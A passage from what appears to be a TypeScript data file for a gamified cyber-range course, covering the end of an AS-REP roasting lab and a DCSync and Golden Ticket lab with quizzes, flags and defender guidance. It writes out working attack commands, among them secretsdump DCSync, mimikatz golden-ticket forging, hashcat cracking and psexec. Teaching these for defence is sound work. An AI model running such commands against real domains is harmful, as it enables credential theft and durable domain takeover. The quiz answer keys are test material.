            "      $krb5asrep$23$svc_legacy@CORP.LOCAL:8f3a...   (no creds used!)",
            "",
            ">> LEARN: a forgotten legacy flag lets you roast with ZERO credentials",
            "   You only needed the username. Fragment collected.",
          ],
        }),
        "crack-asrep": (_args: string[]) => ({
          lines: [
            "$ hashcat -m 18200 asrep.txt rockyou.txt",
            "  $krb5asrep$...svc_legacy...:Welcome2022     <-- CRACKED",
            "  -> svc_legacy / Welcome2022 = your first valid domain credential",
            "  (now: BloodHound, Kerberoast, spray from here ...)",
            "",
            ">> LEARN: no-pre-auth + weak password = a credential-free foothold",
            ">> BLUE TEAM: require pre-auth everywhere; MFA; ban breached passwords.",
            "   Run 'assemble' to view the flag and the submit command.",
          ],
        }),
      },
    },
  },

  // ─── Lab 4: domain dominance — DCSync + golden ticket ───────────────────────
  {
    epochId: "range-ad",
    wonder: { name: "The Golden Ticket", location: "Authorized AD Engagement", era: "Present Day", emoji: "👑" },
    id: "ad-04",
    order: 4,
    title: "Domain Dominance: DCSync & Golden Ticket",
    subtitle: "Own krbtgt, forge access to anything, forever",
    category: "cybersecurity",
    xp: 250,
    badge: { id: "badge-ad-golden", name: "Domain Dominance", emoji: "👑" },
    challengeType: "ctf",
    info: {
      tagline: "Steal the krbtgt key and you can forge a ticket for any user to any service — domain god-mode that survives password resets.",
      year: 2014,
      overview: [
        "Domain dominance is the endgame, and it centers on one secret: the krbtgt account's password hash. In Kerberos, the Key Distribution Center signs every Ticket-Granting Ticket (TGT) with the krbtgt key — it's the master key that validates all authentication in the domain. An attacker with sufficient privilege (Domain Admin, or DCSync rights) performs DCSync — impersonating a domain controller to ask a real DC to replicate account hashes — and pulls the krbtgt hash along with every other credential. With the krbtgt hash, they forge a Golden Ticket: a self-made TGT for any user (including a non-existent 'admin' with Domain Admin group membership), accepted by the entire domain because it's signed with the master key. It is complete, arbitrary, durable domain control.",
        "The durability is what makes it devastating: a Golden Ticket survives the target user's password reset, because it's forged from the krbtgt key, not the user's. The only true remediation is rotating the krbtgt password twice (the protocol keeps the previous key, so you rotate, wait for replication, and rotate again) — and many organizations have never done it. The related Silver Ticket forges a service ticket for a single service using that service's key. The defenses are about protecting Tier-0 and detecting the abuse: rigorously protect domain controllers and Domain Admin credentials (tiered admin, no DA on workstations), restrict and monitor DCSync rights (event 4662 with the replication GUID is the signal), use the Protected Users group and credential guard, and rotate krbtgt regularly (and twice immediately on any suspected compromise). This is where the AD epoch — and the offensive arc — culminates: total control, and the specific, knowable steps that prevent and detect it.",
      ],
      technical: {
        title: "DCSync, Golden & Silver Tickets",
        body: [
          "DCSync (pull the hashes, incl. krbtgt):\n- Requires DA or explicit DCSync rights (Replicating Directory Changes).\n- secretsdump.py -just-dc corp.local/admin@dc (Impacket) or mimikatz lsadump::dcsync.\n- Yields every account's hash — including krbtgt (the domain master key).",
          "Golden Ticket (forge a TGT for anyone, durable):\n- mimikatz kerberos::golden /user:fakeadmin /domain:corp.local /sid:<domain SID> /krbtgt:<hash> /groups:512.\n- Accepted domain-wide (signed with the krbtgt key); grants arbitrary access.\n- Survives the target's password reset — only krbtgt rotation (twice) revokes it.\n- Silver Ticket: forge a TGS for ONE service using that service's key (quieter, narrower).",
          "The defenses (protect Tier-0 + detect + rotate):\n- Protect DCs + DA credentials: tiered admin, no DA on workstations, Protected Users, Credential Guard.\n- Restrict + monitor DCSync rights; alert on event 4662 with the DS-Replication-Get-Changes GUID.\n- Rotate krbtgt regularly, and TWICE immediately on any suspected compromise (the only golden-ticket fix).\n- Detect anomalous ticket lifetimes/usage (golden tickets often have odd defaults).",
        ],
        codeExample: {
          label: "DCSync → forge a Golden Ticket",
          code: `# DCSync to pull the krbtgt hash (needs DA / DCSync rights)
$ secretsdump.py -just-dc-user krbtgt corp.local/admin@10.10.20.10
  krbtgt:502:aad3b...:<krbtgt-NTLM-hash>:::      # the domain master key

# Forge a Golden Ticket — a TGT for a fake Domain Admin
mimikatz # kerberos::golden /user:godmode /domain:corp.local
         /sid:S-1-5-21-... /krbtgt:<hash> /groups:512 /ptt
# -> arbitrary domain access; survives any user's password reset

# THE FIX: rotate krbtgt TWICE on compromise; protect Tier-0; monitor 4662`,
        },
      },
      incident: {
        title: "Golden Tickets — Persistence That Outlives the Reset",
        when: "2014 (mimikatz golden ticket) → the defining AD-persistence technique",
        where: "Compromised Active Directory domains",
        impact: "Total, durable domain control that survives password resets until krbtgt is rotated twice",
        body: [
          "Benjamin Delpy's mimikatz turned the krbtgt key into the ultimate prize: once stolen via DCSync, it lets an attacker forge Golden Tickets that grant god-mode access to the entire domain — and, crucially, persist through the incident-response instinct of resetting passwords, because the tickets derive from krbtgt, not from any user. Numerous breaches saw responders 'clean up' only to find the attacker still inside, because nobody rotated krbtgt.",
          "That is the closing lesson of the Active Directory epoch: domain compromise is preventable and detectable with specific, knowable controls — protect Tier-0 ruthlessly, restrict and monitor DCSync, and rotate krbtgt (twice on compromise). And it ties the whole Cyber Range together: from a low-priv user, BloodHound found the path, Kerberoasting and roasting cracked the credentials, escalation and pivoting reached the DC, and DCSync plus a golden ticket delivered total, durable control — every step of which, reversed, is the defender's prioritized hardening and detection program. Learn the attack to build the defense.",
        ],
      },
      diagram: {
        nodes: [
          { label: "DA / DCSync rights", sub: "secretsdump krbtgt", type: "attacker" },
          { label: "krbtgt key", sub: "the domain master key", type: "system" },
          { label: "Golden Ticket", sub: "forge TGT for anyone", type: "victim" },
          { label: "Durable domain god-mode", sub: "→ fix: protect Tier-0 + rotate krbtgt 2x", type: "result" },
        ],
      },
      timeline: [
        { year: 2014, event: "mimikatz Golden Ticket — forge TGTs from krbtgt", highlight: true },
        { year: 2017, event: "DCSync abuse becomes routine in breaches" },
        { year: 2021, event: "Tier-0 protection + krbtgt rotation standard guidance" },
      ],
      keyTakeaways: [
        "The krbtgt key signs every TGT — stealing it (via DCSync) is domain master-key compromise",
        "DCSync impersonates a DC to replicate account hashes (needs DA / DCSync rights)",
        "A Golden Ticket forges a TGT for any user; accepted domain-wide; SURVIVES password resets",
        "Only rotating krbtgt twice revokes golden tickets; Silver Tickets forge a single service's TGS",
        "Fix: protect Tier-0 (tiered admin, Protected Users), restrict + monitor DCSync (event 4662), rotate krbtgt",
      ],
      references: [
        { title: "MITRE ATT&CK — Golden Ticket (T1558.001) / DCSync (T1003.006)", url: "https://attack.mitre.org/techniques/T1558/001/" },
        { title: "Microsoft — krbtgt reset guidance", url: "https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-reversible-passwords" },
      ],
    },
    quiz: {
      questions: [
        { id: "ad-04-q1", type: "Key", challenge: "The master key.", text: "Why is the krbtgt key the ultimate AD prize?", options: ["It signs every TGT — controlling it means forging any authentication", "It encrypts the disk", "It's the DC's IP", "It's a service port"], correctIndex: 0, explanation: "krbtgt is the Kerberos master key for the domain." },
        { id: "ad-04-q2", type: "DCSync", challenge: "Pull hashes.", text: "What does DCSync do?", options: ["Impersonates a DC to replicate account hashes (incl. krbtgt)", "Scans ports", "Sprays passwords", "Sniffs traffic"], correctIndex: 0, explanation: "DCSync abuses replication to dump credentials." },
        { id: "ad-04-q3", type: "Rights", challenge: "What's needed.", text: "What privilege does DCSync require?", options: ["Domain Admin or explicit DCSync (replication) rights", "Any user", "Guest", "Physical access only"], correctIndex: 0, explanation: "Replication rights (often via DA) enable DCSync." },
        { id: "ad-04-q4", type: "Golden", challenge: "Forge it.", text: "What is a Golden Ticket?", options: ["A forged TGT (signed with krbtgt) granting arbitrary domain access", "A real admin login", "A service ticket only", "A password reset"], correctIndex: 0, explanation: "It's a self-signed TGT accepted domain-wide." },
        { id: "ad-04-q5", type: "Durability", challenge: "Survives reset.", text: "Why does a Golden Ticket survive a user's password reset?", options: ["It's forged from the krbtgt key, not the user's password", "It uses MFA", "It's encrypted", "It doesn't survive"], correctIndex: 0, explanation: "Only krbtgt rotation invalidates it." },
        { id: "ad-04-q6", type: "Remediation", challenge: "The only fix.", text: "How do you actually revoke Golden Tickets?", options: ["Rotate the krbtgt password twice (with replication in between)", "Reset the user's password", "Reboot the DC", "Change the DC IP"], correctIndex: 0, explanation: "Double krbtgt rotation is the only true remediation." },
        { id: "ad-04-q7", type: "Silver", challenge: "Narrower.", text: "What is a Silver Ticket?", options: ["A forged TGS for a single service using that service's key", "A forged TGT for everything", "A password spray", "A DoS"], correctIndex: 0, explanation: "Silver tickets forge access to one service, quieter than golden." },
        { id: "ad-04-q8", type: "Defense", challenge: "Detect it.", text: "Which event signals DCSync abuse?", options: ["Event 4662 with the DS-Replication-Get-Changes GUID", "A single 4624 login", "A DNS query", "High CPU"], correctIndex: 0, explanation: "Replication requests from non-DCs are the DCSync tell." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.20.50", hostname: "ws-da", os: "Windows (Domain Admin obtained)" },
      targetMachine: dom("krbtgt extractable via DCSync → golden ticket; no Tier-0 protection / krbtgt never rotated"),
      scenario: "You reached Domain Admin on CORP.LOCAL. Make it permanent: DCSync the krbtgt hash, then forge a Golden Ticket that grants god-mode access surviving any password reset.",
      hint: "DCSync to pull krbtgt, then forge a golden ticket for a fake Domain Admin.",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "DCSync the krbtgt hash. Run: dcsync-krbtgt",
        "Forge the golden ticket. Run: golden-ticket",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{G0LD3N_T1CK3T_", label: "Domain Dominance Briefing" },
        { trigger: "dcsync-krbtgt", value: "KRBTGT_", label: "krbtgt Hash Extracted" },
        { trigger: "golden-ticket", value: "D0M41N}", label: "Golden Ticket Forged" },
      ],
      files: {
        "/briefing.txt": [
          "RANGE — AD LAB 4: DOMAIN DOMINANCE (you are Domain Admin)",
          "Goal: DCSync krbtgt, forge a golden ticket (durable god-mode).",
          "Sequence: dcsync-krbtgt -> golden-ticket -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "dcsync-krbtgt": (_args: string[]) => ({
          lines: [
            "$ secretsdump.py -just-dc-user krbtgt corp.local/admin@10.10.20.10",
            "  [*] Dumping Domain Credentials (DCSync)...",
            "  krbtgt:502:aad3b435b51404ee:5f4dcc...<krbtgt-NTLM-hash>:::",
            "  Domain SID: S-1-5-21-1004336348-1177238915-682003330",
            "",
            ">> LEARN: krbtgt is the domain master key — DCSync replicated it out",
            ">> BLUE TEAM: event 4662 (replication from a non-DC) is the tell. Fragment collected.",
          ],
        }),
        "golden-ticket": (_args: string[]) => ({
          lines: [
            "mimikatz # kerberos::golden /user:godmode /domain:corp.local",
            "           /sid:S-1-5-21-1004336348-... /krbtgt:5f4dcc... /groups:512 /ptt",
            "  [+] Golden Ticket for 'godmode' (Domain Admins) injected.",
            "$ psexec.py corp.local/godmode@10.10.20.10   ->  NT AUTHORITY\\SYSTEM on the DC",
            "  -> arbitrary domain access; SURVIVES any user's password reset",
            "",
            ">> LEARN: a forged TGT signed by krbtgt = durable domain god-mode",
            ">> BLUE TEAM: rotate krbtgt TWICE; protect Tier-0; Protected Users; monitor 4662.",
            "   The whole chain, reversed, is the defense. Run 'assemble' for the flag.",
          ],
        }),
      },
    },
  },
];
